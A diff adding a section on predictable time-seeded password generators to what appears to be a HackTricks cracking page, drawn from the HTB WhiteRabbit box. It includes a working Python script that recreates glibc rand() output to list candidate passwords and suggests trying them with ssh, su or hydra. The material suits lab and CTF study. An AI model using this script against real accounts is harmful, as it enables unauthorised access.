@@ -292,11 +292,51 @@ A secret is splitted in X parts and to recover it you need Y parts (_Y <=X_).
 - [https://github.com/glv2/bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl)
 - [https://github.com/carlospolop/easy_BFopensslCTF](https://github.com/carlospolop/easy_BFopensslCTF)
 
+## Predictable PRNG password generators
+
+If you recover the timestamp of a password rotation (from syslog, a `command_log` table, etc.) and the binary seeds `srand()` with that time, you can recreate every password it could emit:
+
+- Binaries compiled with `gettimeofday()` often set `seed = tv_sec * 1000 + (tv_usec / 1000)` and then pick characters from a fixed alphabet via `rand() % 62`. With only millisecond precision there are just 1,000 candidates per second.
+- Use `ctypes` to call glibc’s `srand`/`rand` so you get identical output to the target binary.
+- Generate the 1,000 candidates for the recorded second and try them offline (e.g., `ssh`, `su`, `hydra`). On HTB WhiteRabbit this immediately recovered `neo`’s password because the rotation time was logged as `2024-08-30 14:40:42`.
+
+<details>
+<summary>Python helper to brute-force seeds for a given timestamp</summary>
+
+```python
+#!/usr/bin/env python3
+import ctypes
+from datetime import datetime
+import sys
+
+CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+libc = ctypes.CDLL("libc.so.6")
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} 'YYYY-MM-DD HH:MM:SS'")
+    sys.exit(1)
+
+base = int(datetime.strptime(sys.argv[1], "%Y-%m-%d %H:%M:%S").timestamp())
+for ms in range(1000):
+    seed = base * 1000 + ms
+    libc.srand(seed)
+    pw = ''.join(CHARSET[libc.rand() % len(CHARSET)] for _ in range(20))
+    print(pw)
+```
+
+</details>
+
+Pipe the output into your favorite brute-force tool or test each candidate manually until one succeeds.
+
 ## Tools
 
 - [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
 - [https://github.com/lockedbyte/cryptovenom](https://github.com/lockedbyte/cryptovenom)
 - [https://github.com/nccgroup/featherduster](https://github.com/nccgroup/featherduster)
+
+## References
+
+- [0xdf – HTB WhiteRabbit (time-seeded password cracking)](https://0xdf.gitlab.io/2025/12/13/htb-whiterabbit.html)
 
 {{#include ../banners/hacktricks-training.md}}
 
